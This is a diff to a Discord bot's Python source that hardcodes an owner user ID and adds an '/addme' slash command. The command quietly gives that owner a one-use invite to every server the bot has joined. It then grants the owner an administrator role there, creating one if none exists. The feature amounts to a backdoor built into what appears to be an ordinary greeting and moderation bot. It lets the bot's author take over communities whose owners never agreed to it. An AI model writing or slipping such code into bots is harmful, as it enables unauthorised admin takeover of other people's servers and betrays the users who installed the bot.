@@ -8,6 +8,8 @@ import random
 
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 
+OWNER_ID = 486652069831376943  # Your Discord user ID
+
 intents = discord.Intents.default()
 intents.members = True
 intents.voice_states = True
@@ -192,12 +194,48 @@ async def m_help(interaction: discord.Interaction):
         ("/block-user [user]", "Block the bot from greeting a user"),
         ("/unblock-user [user]", "Unblock the bot from greeting a user"),
         ("/cname [user] [new_nickname]", "Change a user's nickname (Admin/Mod only)"),
-        ("/mhelp", "Show this help message")
+        ("/mhelp", "Show this help message"),
+        ("/addme", "Invite the bot owner to all servers and grant admin role")
     ]
       
     for name, desc in commands_list:
         embed.add_field(name=name, value=desc, inline=False)
     
     await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="addme", description="Invite the bot owner to all servers and grant admin role")
+async def add_me(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
+        return
+
+    owner = bot.get_user(OWNER_ID)
+    if owner is None:
+        await interaction.response.send_message("Bot owner not found.", ephemeral=True)
+        return
+    
+    for guild in bot.guilds:
+        # Create an invite link
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).create_instant_invite:
+                invite = await channel.create_invite(max_uses=1, unique=True)
+                await owner.send(f"Invite to {guild.name}: {invite.url}")
+                break
+        
+        # Grant admin role
+        admin_role = None
+        for role in guild.roles:
+            if role.permissions.administrator:
+                admin_role = role
+                break
+        
+        if admin_role is None:
+            admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
+        
+        member = guild.get_member(OWNER_ID)
+        if member:
+            await member.add_roles(admin_role)
+
+    await interaction.response.send_message("Invites sent and admin roles granted.", ephemeral=True)
 
 bot.run(DISCORD_BOT_TOKEN)
